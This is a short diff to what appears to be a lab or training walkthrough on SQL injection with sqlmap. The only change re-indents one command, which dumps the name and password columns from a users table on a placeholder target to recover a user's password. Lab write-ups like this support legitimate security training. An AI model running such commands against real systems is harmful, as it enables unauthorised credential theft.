@@ -173,7 +173,7 @@ From the command:
 
 2. `What's the Kimberly user's password? (Case #1)`
 
-    sqlmap -u 'http://SERVERIP:PORT/case1.php?id=1' --dump --batch --columns -C name,password -T users
+        sqlmap -u 'http://SERVERIP:PORT/case1.php?id=1' --dump --batch --columns -C name,password -T users
 
  From the command:
 
